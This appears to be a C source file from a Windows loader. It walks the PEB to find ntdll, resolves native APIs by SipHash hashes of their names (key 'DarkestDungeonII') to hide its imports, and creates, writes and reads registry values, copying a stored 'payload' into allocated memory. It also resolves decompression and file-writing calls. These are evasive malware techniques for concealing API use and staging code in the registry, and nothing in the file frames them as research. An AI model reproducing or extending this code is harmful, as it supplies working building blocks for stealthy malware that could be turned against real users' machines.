#include "ntlib.h"

int CompareBaseName(const wchar_t *s1, const wchar_t *s2) {
    while (*s1 && *s2) {
        wchar_t c1 = *s1;
        wchar_t c2 = *s2;
        // Basic lower-casing for case insensitivity
        if (c1 >= L'A' && c1 <= L'Z') c1 += 32;
        if (c2 >= L'A' && c2 <= L'Z') c2 += 32;
        if (c1 != c2) return 0;
        s1++;
        s2++;
    }
    return (*s2 == L'\0');
}


#define ROTL(x, b) (uint64_t)(((x) << (b)) | ((x) >> (64 - (b))))

#define SIPROUND do { \
v0 += v1; v1 = ROTL(v1, 13); v1 ^= v0; v0 = ROTL(v0, 32); \
v2 += v3; v3 = ROTL(v3, 16); v3 ^= v2; \
v0 += v3; v3 = ROTL(v3, 21); v3 ^= v0; \
v2 += v1; v1 = ROTL(v1, 17); v1 ^= v2; v2 = ROTL(v2, 32); \
} while (0)

uint64_t siphash24(const void *src, size_t len, const uint8_t key[16]) {
    const uint8_t *m = (const uint8_t *) src;
    uint64_t k0 = ((uint64_t *) key)[0];
    uint64_t k1 = ((uint64_t *) key)[1];

    // 1. Initialization
    uint64_t v0 = k0 ^ 0x736f6d6570736575ULL;
    uint64_t v1 = k1 ^ 0x646f72616e646f6dULL;
    uint64_t v2 = k0 ^ 0x6c7967656e657261ULL;
    uint64_t v3 = k1 ^ 0x7465646279746573ULL;
    uint64_t b = ((uint64_t) len) << 56;

    // 2. Compression (Process 8-byte blocks)
    while (len >= 8) {
        uint64_t mi = *(uint64_t *) m;
        v3 ^= mi;
        SIPROUND;
        SIPROUND;
        v0 ^= mi;
        m += 8;
        len -= 8;
    }

    // 3. Handle leftover bytes and padding
    uint64_t t = 0;
    for (unsigned i = 0; i < len; i++) t |= ((uint64_t) m[i]) << (i * 8);
    v3 ^= (b | t);
    SIPROUND;
    SIPROUND;
    v0 ^= (b | t);

    // 4. Finalization
    v2 ^= 0xff;
    SIPROUND;
    SIPROUND;
    SIPROUND;
    SIPROUND;

    return v0 ^ v1 ^ v2 ^ v3;
}


void InitUnicodeString(PUNICODE_STRING target, PCWSTR source) {
    USHORT length = 0;
    while (source[length]) length++;
    target->Length = length * sizeof(WCHAR);
    target->MaximumLength = (length + 1) * sizeof(WCHAR);
    target->Buffer = (PWSTR) source;
}

HMODULE GetLibraryBase(const wchar_t *dllName) {
    // Correct x64 PEB access
    PPEB peb = (PPEB) __readgsqword(0x60);

    // Navigate: PEB -> Ldr -> InLoadOrderModuleList
    PLIST_ENTRY list_head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY current_node = list_head->Flink;

    while (current_node != list_head) {
        PLDR_DATA_TABLE_ENTRY libraryEntry = CONTAINING_RECORD(current_node, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (libraryEntry->BaseDllName.Buffer != NULL) {
            if (CompareBaseName(libraryEntry->BaseDllName.Buffer, dllName)) {
                return (HMODULE) libraryEntry->DllBase;
            }
        }
        current_node = current_node->Flink;
    }
    return NULL;
}

void *GetProcAddressByHash(HMODULE hModule, uint64_t targetHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) ((BYTE *) hModule + dosHeader->e_lfanew);

    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY) ((BYTE *) hModule + exportDirRVA);

    DWORD *nameArray = (DWORD *) ((BYTE *) hModule + exportDir->AddressOfNames);
    WORD *ordinalArray = (WORD *) ((BYTE *) hModule + exportDir->AddressOfNameOrdinals);
    DWORD *functionArray = (DWORD *) ((BYTE *) hModule + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char *functionName = (const char *) ((BYTE *) hModule + nameArray[i]);
        if (siphash24(functionName, strlen(functionName), key) == targetHash) {
            WORD functionOrdinal = ordinalArray[i];
            return (void *) ((BYTE *) hModule + functionArray[functionOrdinal]);
        }
    }
    return NULL;
}

void ArchiveNativeAPIs(HMODULE hNtdll, API_TABLE *table) {
    // Using SipHash-2-4 (Key: "DarkestDungeonII")
    table->NtCreateKey = (pNtCreateKey) GetProcAddressByHash(hNtdll, 0x20ABEEDF867D03D3);
    table->NtSetValueKey = (pNtSetValueKey) GetProcAddressByHash(hNtdll, 0xF9C03F22041D350C);
    table->NtQueryValueKey = (pNtQueryValueKey) GetProcAddressByHash(hNtdll, 0x7C8E2B464F8201F0);
    table->NtClose = (pNtClose) GetProcAddressByHash(hNtdll, 0x31064A33BCAFEEF2);
    table->NtOpenKey = (pNtOpenKey) GetProcAddressByHash(hNtdll, 0xE2B307CA08FAF7B4);
    table->NtWriteFile = (pNtWriteFile) GetProcAddressByHash(hNtdll, 0x091F850DE658AD05);
    table->NtCreateFile = (pNtCreateFile) GetProcAddressByHash(hNtdll, 0x066728514DC4D083);
    table->RtlDecompressBuffer = (pRtlDecompressBuffer) GetProcAddressByHash(hNtdll, 0x515BF95094AEF5BC);
    table->NtAllocateVirtualMemory = (pNtAllocateVirtualMemory) GetProcAddressByHash(hNtdll, 0xA3366BF36724CFFC);
    table->NtFreeVirtualMemory = (pNtFreeVirtualMemory) GetProcAddressByHash(hNtdll, 0xCF7B86A020833AF1);
    table->RtlCopyMemory = (pRtlCopyMemory) GetProcAddressByHash(hNtdll, 0xE5398E62BAB53CFD);
}


HANDLE CreateRegistryKey(PCWSTR path, API_TABLE *api) {
    HANDLE newKeyHandle = NULL;

    UNICODE_STRING registryPath;
    InitUnicodeString(&registryPath, path);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &registryPath, 0x00000040 | 0x00000002, NULL, NULL);

    ULONG disp = 0;

    NTSTATUS status = api->NtCreateKey(&newKeyHandle, 0x000F003F, &objAttr, 0, NULL, 0x00000000, &disp);
    if (status == 0) {
        return newKeyHandle;
    }
    return nullptr;
}

HANDLE OpenRegistryKey(PCWSTR path, API_TABLE *api) {
    UNICODE_STRING registryPath;
    InitUnicodeString(&registryPath, path);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &registryPath, 0x00000040 | 0x00000002, NULL, NULL);

    HANDLE handle = NULL;

    if (api->NtOpenKey(&handle, 0x20003, &objAttr) == 0)
        return handle;
    return nullptr;
}


NTSTATUS SetRegistryKeyValue(HANDLE keyHandle, PCWSTR name, ULONG type, void *value, ULONG dataSize, API_TABLE *api) {
    UNICODE_STRING entryName;
    InitUnicodeString(&entryName, name);

    if (keyHandle != NULL) {
        return api->NtSetValueKey(keyHandle, &entryName, 0, type, value, dataSize);
    }
    return (NTSTATUS) 0xC0000008; // STATUS_INVALID_HANDLE
}

void *allocateMemory(API_TABLE *api, size_t size) {
    void *location = nullptr;
    size_t allocatedSize = size;
    NTSTATUS allocationResult = api->NtAllocateVirtualMemory((HANDLE) -1, &location, 0, &allocatedSize,
                                                             0x00001000 | 0x00002000, 0x04);
    if (allocationResult != 0) {
        freeMemory(api, location);
        return nullptr;
    }
    return location;
}

NTSTATUS freeMemory(API_TABLE *api, void *location) {
    size_t regionSize = 0;
    return api->NtFreeVirtualMemory((HANDLE) -1, location, &regionSize, 0x00008000);
}

void *QueryRegistryKey(HANDLE keyhandle, PCWSTR path, PCWSTR name, API_TABLE *api) {
    if (keyhandle == nullptr) {
        keyhandle = OpenRegistryKey(path, api);
    }

    UNICODE_STRING entryName;
    InitUnicodeString(&entryName, name);

    unsigned long regDataSize = 0;
    NTSTATUS status = api->NtQueryValueKey(keyhandle, &entryName, KeyValuePartialInformation, NULL, 0, &regDataSize);

    // 0xC0000023 = STATUS_BUFFER_TOO_SMALL
    if (status == 0xC0000023) {
        PKEY_VALUE_PARTIAL_INFORMATION pInfo = (PKEY_VALUE_PARTIAL_INFORMATION) allocateMemory(api, regDataSize);
        if (!pInfo) return nullptr;

        status = api->NtQueryValueKey(keyhandle, &entryName, KeyValuePartialInformation, pInfo, regDataSize,
                                      &regDataSize);

        if (status == 0) {
            // STATUS_SUCCESS
            void *payload = allocateMemory(api, pInfo->DataLength);
            if (payload) {
                api->RtlCopyMemory(payload, pInfo->Data, pInfo->DataLength);
            }

            freeMemory(api, pInfo);
            return payload;
        }

        freeMemory(api, pInfo);
    }
    return nullptr;
}

